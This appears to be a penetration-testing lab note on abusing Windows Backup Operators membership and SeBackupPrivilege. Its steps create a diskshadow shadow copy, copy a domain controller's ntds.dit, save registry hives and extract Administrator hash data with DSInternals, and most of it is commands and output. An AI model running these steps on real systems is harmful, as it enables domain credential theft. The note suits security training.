Sometimes, we can utilize account with specific Built-In Groups to archive privilege escalation or as opener to path towards other account.

One Example would be the Backup Operators Account, we first run whoami /priv to confirm we have respective privilege, we afterward need to load https://github.com/giuliano108/SeBackupPrivilege this tools over to target.

We import them both in PS, then enable privilege by following:
```
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```

Now we can copy any protected file which can expose sensitive information.

However, there is more of it, this group would give user permission to login locally to a DC, and since we can copy any file, we can now target the NTDS.dit file in the DC, we can use diskshadow to make a shadow copy of C drive and expose it as other drive, take the following example:
```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

Next, we can use the Copy-FileSeBackupPrivilege from previous mentioned cmdlet to copy NTDS.dit:
```
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

Or, we can use built in robocopy utility:


Next, we use reg save to dump SAM, SYSTEM and SECURITY (if we need local ac as well):
```
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

Next, we transfer those file back to us, or if such is not possible, we use deploy DSInternals.psd1 over to our victim and expose NTLM Hash:
```
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
<...snip...>
```